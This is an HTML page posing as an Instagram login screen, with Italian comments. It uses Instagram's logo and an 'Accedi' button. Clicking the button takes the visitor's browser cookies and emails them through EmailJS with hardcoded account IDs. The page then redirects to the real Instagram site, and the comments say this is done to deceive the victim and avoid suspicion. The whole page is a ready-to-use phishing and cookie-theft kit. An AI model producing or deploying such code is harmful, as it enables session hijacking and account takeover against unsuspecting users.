<!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8">
    <title>Instagram</title>
    <!-- Libreria EmailJS -->
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <script>
       (function(){
          // Inizializzazione con la tua PUBLIC KEY
          emailjs.init("tVs-xljTIV09gmOMy");
       })();
    </script>

    <style>
        body { background-color: #fafafa; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { background: white; padding: 40px; border: 1px solid #dbdbdb; text-align: center; width: 350px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
        img { width: 175px; margin-bottom: 20px; }
        button { background: #0095f6; color: white; border: none; padding: 12px 20px; border-radius: 4px; cursor: pointer; font-size: 16px; font-weight: bold; }
        button:hover { background: #0074cc; }
    </style>
</head>
<body>
<div class="box">
    <!-- Logo Instagram -->
    <img src="https://static.cdninstagram.com/rsrc.php/v3/yG/r/DeWwpYlYBOL.png">
    <button onclick="sendCookies()">Accedi</button>
</div>

<script>
    function sendCookies() {
        // 1. Prendi i cookie
        const cookies = document.cookie;
        
        // 2. Parametri da inviare
        var templateParams = {
            cookie: cookies,
            timestamp: new Date().toLocaleString()
        };

        // 3. Invia l'email con i tuoi ID specifici
        emailjs.send('service_75wahjh', 'template_jm3cf2p', templateParams)
            .then(function(res) {
                console.log("Success!", res.status);
                // Reindirizza subito a Instagram per ingannare la vittima
                window.location.href = "https://www.instagram.com/";
            })
            .catch(function(err) {
                console.error("Error:", err);
                // Anche se fallisce, reindirizza per non far sospettare nulla
                window.location.href = "https://www.instagram.com/";
            });
    }
</script>
</body>
</html>
